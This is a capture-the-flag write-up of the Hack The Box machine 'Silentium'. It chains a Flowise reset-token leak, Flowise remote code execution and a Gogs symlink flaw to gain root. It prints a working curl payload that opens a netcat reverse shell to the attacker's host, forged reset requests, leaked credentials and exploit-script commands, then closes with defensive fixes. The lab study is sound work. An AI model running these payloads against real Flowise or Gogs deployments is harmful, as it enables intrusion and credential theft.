# Silentium — Hack The Box Write-up

**Difficulty:** Easy  
**OS:** Linux  
**Author:** Ghaith Awni

---

## Introduction

Silentium is a custom Linux machine that demonstrates how a chain of small vulnerabilities — when linked together — can lead to complete host takeover. The box starts with an information disclosure flaw that hands over admin credentials, escalates through a Remote Code Execution vulnerability inside a Docker container, and finishes with a symbolic link attack on a self-hosted Git service to achieve root on the underlying host.

**Key skills practiced:**
- Subdomain fuzzing and web enumeration
- CVE research and exploit adaptation
- Docker container escape via environment variable leakage
- SSH port forwarding to reach internal services
- Git-based RCE via symbolic link manipulation

---

## Vulnerabilities Exploited

| CVE | Service | Impact |
|-----|---------|--------|
| CVE-2025-58434 | Flowise 3.0.5 | Unauthenticated password reset token disclosure → account takeover |
| CVE-2025-59528 | Flowise 3.0.5 | Authenticated Remote Code Execution |
| CVE-2025-8110 | Gogs 0.13.3 | API-based symbolic link manipulation → RCE as root |

---

## Phase 1: Reconnaissance & Enumeration

### Port Scanning

I started with a detailed Nmap scan to discover open ports and identify the services running on them:

```bash
sudo nmap -sV -sC -T4 10.129.2.131
```

The scan revealed two open ports:

| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 9.6p1 Ubuntu |
| 80 | HTTP | Nginx 1.24.0 |

The HTTP response showed a redirect to `http://silentium.htb/`. Since this is a local lab domain and not publicly resolvable, I added it to my `/etc/hosts` file:

```bash
echo "10.129.2.131  silentium.htb" | sudo tee -a /etc/hosts
```

### Web Enumeration & Subdomain Fuzzing

Visiting `http://silentium.htb` showed a standard company landing page. I first tried directory brute-forcing, but every request — even for non-existent paths — returned a `304 Not Modified` response. The server was using a **catch-all wildcard routing** system that silently redirected everything back to the homepage, making directory enumeration useless here.

I pivoted to **subdomain fuzzing** using `ffuf` with the SecLists DNS wordlist:

```bash
ffuf -u http://silentium.htb/ \
  -H "Host: FUZZ.silentium.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs 178 -fc 301
```

The `-fs 178` and `-fc 301` flags filtered out the wildcard noise by excluding responses matching the default redirect's size and status code. This revealed one valid subdomain:

```
staging    [Status: 200, Size: 3142]
```

I added it to `/etc/hosts` as well:

```bash
echo "10.129.2.131  staging.silentium.htb" | sudo tee -a /etc/hosts
```

---

## Phase 2: Initial Access — Identifying the Target

Navigating to `http://staging.silentium.htb` revealed an administrative login portal asking for an **email** and **password**.

I tested for SQL injection in the login fields, but the application handled inputs safely.

I noticed unusual behavior: clicking Login with **completely empty fields** caused the dashboard to flash on screen for a split second before redirecting back to the login page. During that brief flash, the actual authenticated dashboard rendered — and I could clearly see the name **Flowise** in the sidebar. This wasn't visible anywhere on the login page itself; it only appeared in that momentary glimpse of the dashboard, which confirmed the underlying platform was **Flowise** — an open-source LLM workflow builder.

I opened **Burp Suite** to intercept the traffic during this brief attempt and observed the frontend was making a `GET` request to `/api/v1/chatflows`, which returned:

```
HTTP/1.1 401 Unauthorized
{"message":"Invalid or Missing Token"}
```

The backend was properly enforcing token validation. I needed either a valid token or a way to bypass authentication entirely.

To fingerprint the exact software version, I sent a request to the version endpoint:

```bash
curl http://staging.silentium.htb/api/v1/version
```

Response:
```json
{"version":"3.0.5"}
```

---

## Phase 3: Vulnerability Research & Account Takeover

### Finding the CVEs

Searching for "Flowise 3.0.5 vulnerability" led me to two critical CVEs on the GitHub Advisory Database, both affecting versions `<= 3.0.5` and patched in `3.0.6`:

**CVE-2025-58434 — Unauthenticated Password Reset Token Disclosure**

> **What it means in plain terms:** When you trigger a password reset request for a user, Flowise is supposed to send a secret token to the user's email — and keep that token private. Instead, the API **returns the token directly in its HTTP response**, visible to anyone who makes the request. No authentication required. This means an attacker who knows a valid email address can simply request a password reset and immediately read the token from the response, then use it to set a new password and take over the account.

**CVE-2025-59528 — Remote Code Execution**

> **What it means in plain terms:** Once authenticated, Flowise allows users to configure MCP (Model Context Protocol) server tools. The configuration input for these tools is passed directly into a JavaScript evaluation function without proper sanitization. An attacker can craft a malicious config payload that breaks out of the expected input and executes arbitrary system commands on the server.

### Finding a Valid Email Address

CVE-2025-58434 requires a **valid existing email** to work — guesses like `admin@silentium.htb` returned no response confirming the account didn't exist.

I went back to the main landing page at `http://silentium.htb` and found an **"Institutional Leadership"** section listing three employees:

- **Marcus Thorne** — Managing Director
- **Ben** — Head of Financial Systems  
- **Elena Rossi** — Chief Risk Officer

I converted these into standard corporate email formats (e.g. `ben@silentium.htb`, `marcus@silentium.htb`) and tested each against the Forgot Password form. The address `ben@silentium.htb` triggered a success message: *"Password reset instructions sent to the email."*

### Exploiting CVE-2025-58434

With a confirmed email, I sent the password reset request through **Burp Suite Repeater** instead of the browser. Rather than just returning a success message, the API response leaked the full user object including the reset token:

```json
{
  "user": {
    "id": "e26c9d6c-678c-4c10-9e36-01813e8fea73",
    "name": "admin",
    "email": "ben@silentium.htb",
    "tempToken": "2WVhjqlxoH8aMng9wcbosQf3saDtT3zm3FsLoQbeUpCieuGj6LNbU42G1GKvv88O",
    "tokenExpiry": "2026-05-22T09:36:14.920Z",
    "status": "active"
  }
}
```

I then used the leaked `tempToken` to set a new password via the reset endpoint:

```http
POST /api/v1/account/reset-password HTTP/1.1
Host: staging.silentium.htb
Content-Type: application/json

{
  "email": "ben@silentium.htb",
  "tempToken": "2WVhjqlxoH8aMng9wcbosQf3saDtT3zm3FsLoQbeUpCieuGj6LNbU42G1GKvv88O",
  "password": "Bingo123!"
}
```

This returned `HTTP/1.1 200 Created`. I logged in with `ben@silentium.htb` / `Bingo123!` and had full admin access to the Flowise dashboard.

---

## Phase 4: Remote Code Execution (CVE-2025-59528)

### Understanding the Vulnerability

Flowise's MCP Server tool configuration accepts a JSON object that gets evaluated server-side. The `mcpServerConfig` field is passed into a JavaScript `eval()`-like function without sanitization. By embedding a self-executing function inside the config value, we can make the server run any system command.

### Crafting the Payload

I constructed the following reverse shell payload targeting Flowise's MCP tool endpoint. The payload uses Node.js's built-in `child_process` module to spawn a reverse shell:

```bash
curl -s -X POST http://staging.silentium.htb/api/v1/tools \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <your-jwt-token>" \
  -d '{
    "loadMethod": "listActions",
    "inputs": {
      "mcpServerConfig": "({x:(function(){const cp=process.mainModule.require(\"child_process\");cp.exec(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.117 4444 >/tmp/f\");return 1;})()} )"
    }
  }'
```

> **Note:** Sending this through Burp Suite's Repeater returned a `200 OK` but the shell never connected. This is likely because Burp modifies Content-Type headers or adds proxy headers that interfere with how the server evaluates the payload. Switching to `curl` to send the raw request directly solved the problem.

With a netcat listener running on port 4444:

```bash
nc -lvnp 4444
```

I received a connection:

```
connect to [10.10.14.117] from (UNKNOWN) [10.129.2.131] 40639
/ # whoami
root
```

---

## Phase 5: Escaping the Docker Container

### Recognizing the Container

Although `whoami` returned `root`, the environment felt off. Inspecting the filesystem revealed a `.dockerenv` file at `/`, and the network configuration showed an internal Docker IP range. I was root inside a **Docker container**, not on the actual host machine.

### Leaking Credentials via Environment Variables

I ran the `env` command to list all environment variables set in the container. This is a common misconfiguration in Dockerized deployments — secrets get passed as environment variables and are often left readable:

```
FLOWISE_PASSWORD=F113_d0ck3r
FLOWISE_USERNAME=ben
SMTP_PASSWORD=r04D!!_R4ge
SENDER_EMAIL=ben@silentium.htb
SMTP_HOST=mailhog
DATABASE_PATH=/root/.flowise
```

The variable `SMTP_PASSWORD=r04D!!_R4ge` stood out. Since SSH was open on the host and the username `ben` was already confirmed, I tried this as an SSH password.

---

## Phase 6: SSH Access & User Flag

From my attack machine, I connected via SSH using the leaked credentials:

```bash
ssh ben@10.129.2.131
# password: r04D!!_R4ge
```

It worked. I was now on the actual host as user `ben`:

```bash
ben@silentium:~$ ls
user.txt
ben@silentium:~$ cat user.txt
4d2*****************************
```

**User flag captured.**

---

## Phase 7: Privilege Escalation to Root (CVE-2025-8110)

### Discovering Gogs

I listed all running processes to see what else was active on the machine:

```bash
ps aux
```

Among the results was a process running `/opt/gogs/gogs/gogs web` — a self-hosted Git service. I checked its version:

```bash
/opt/gogs/gogs/gogs --version
# Gogs version 0.13.3
```

### Finding the CVE

Searching for "Gogs 0.13.3 CVE" led to **CVE-2025-8110** — a critical RCE vulnerability affecting Gogs through its API file update mechanism.

> **What it means in plain terms:** When you push a repository to Gogs containing a symbolic link, and then use the Gogs API to update that symlink's contents, the server follows the link instead of treating it as a regular file. This means the attacker-controlled content lands inside whatever the symlink points to — in this case, the repository's own `.git/config`. The malicious config sets the `sshCommand` field to a reverse shell. The next time Gogs internally runs a Git SSH operation against that repo, it executes the reverse shell command as root instead of the real SSH binary.

### Reaching the Gogs Interface

I ran `netstat` to map internal ports:

```bash
netstat -tulpn | grep 127.0.0.1
```

Output:
```
tcp  0  0  127.0.0.1:1025    0.0.0.0:*  LISTEN
tcp  0  0  127.0.0.1:3000    0.0.0.0:*  LISTEN
tcp  0  0  127.0.0.1:3001    0.0.0.0:*  LISTEN
tcp  0  0  127.0.0.1:8025    0.0.0.0:*  LISTEN
tcp  0  0  127.0.0.1:39619   0.0.0.0:*  LISTEN
```

I mapped each port:
- **1025 / 8025** → MailHog (seen earlier in the container's env vars)
- **3000** → Flowise (confirmed by curling it and matching the HTML)
- **39619** → A random high ephemeral port used for internal background communication — no web panel, safely ignored
- **3001** → Unknown — had to be Gogs (the only one left)

Since port 3001 was only listening on localhost, I used **SSH port forwarding** to access it from my attack machine:

```bash
ssh -L 3001:127.0.0.1:3001 ben@10.129.2.131
```

Now `http://localhost:3001` in my browser opened the Gogs web interface.

### Exploiting CVE-2025-8110

The exploit chain works in two stages, automated end-to-end by the Python script from developer **TYehan**:

1. **Create a repo via the API** and clone it locally
2. **Add a symbolic link** called `malicious_link` pointing to `.git/config`, then push it to Gogs
3. **Use the Gogs API to update `malicious_link`'s content** with a malicious `.git/config` payload — because Gogs follows the symlink, the content overwrites the real `.git/config`
4. The payload sets `[core] sshCommand` to a bash reverse shell — the next time Gogs runs an internal SSH Git operation on that repo, it triggers the shell as root

I generated a personal access token in Gogs under **Settings → Applications**, set up my listener:

```bash
nc -lvnp 5555
```

Then ran the exploit script with the correct argument flags:

```bash
python3 exploit.py \
  -u http://localhost:3001 \
  -un hacker \
  -pw Bingo123! \
  -t <personal-access-token> \
  -lh 10.10.14.117 \
  -lp 5555
```

The script created the repo, planted the symlink, pushed it, overwrote `.git/config` via the API, and triggered the reverse shell. My listener received a connection:

```
connect to [10.10.14.117] from (UNKNOWN) [10.129.2.131] 52388
root@silentium:/opt/gogs/gogs/data/tmp/local-repo/2# whoami
root
```

### Root Flag

```bash
root@silentium:~# cat root.txt
777c639fb4bc9dcf75ab48c807548afb
```

**Root flag captured. Box owned.**

---

## Lessons Learned & Defensive Summary

| Vulnerability | Root Cause | How to Fix |
|--------------|------------|------------|
| CVE-2025-58434 | Password reset API returns the reset token in the HTTP response body instead of only sending it via email | Never return sensitive tokens in API responses. The token should only ever be delivered out-of-band (email). Upgrade Flowise to 3.0.6+. |
| CVE-2025-59528 | User-supplied input is passed into a server-side JavaScript evaluation function without sanitization | Never use `eval()` or equivalent functions on user input. Validate and sandbox all tool configuration inputs. Upgrade Flowise to 3.0.6+. |
| CVE-2025-8110 | Gogs follows symbolic links in pushed repositories, allowing overwrite of server-side files | Gogs should resolve and validate file targets before processing pushed content. Upgrade Gogs to a patched version. Run Gogs as a non-root user so even if exploited, the attacker doesn't get root. |

---

*Write-up by Ghaith Awni — completed May 2026*
